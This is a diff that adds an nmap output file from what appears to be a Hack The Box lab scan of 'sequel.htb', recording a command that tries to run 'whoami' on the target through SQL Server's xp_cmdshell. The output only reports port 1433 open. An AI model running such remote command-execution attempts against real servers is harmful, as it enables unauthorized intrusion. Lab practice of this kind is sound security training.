@@ -1,0 +1,8 @@
+# Nmap 7.94SVN scan initiated Sun May 26 01:01:32 2024 as: nmap --script ms-sql-xp-cmdshell --script-args=ms-sql-xp-cmdshell.cmd=whoami -p 1433 -oN mssql2 10.129.228.253
+Nmap scan report for sequel.htb (10.129.228.253)
+Host is up (0.23s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+
+# Nmap done at Sun May 26 01:01:38 2024 -- 1 IP address (1 host up) scanned in 6.22 seconds
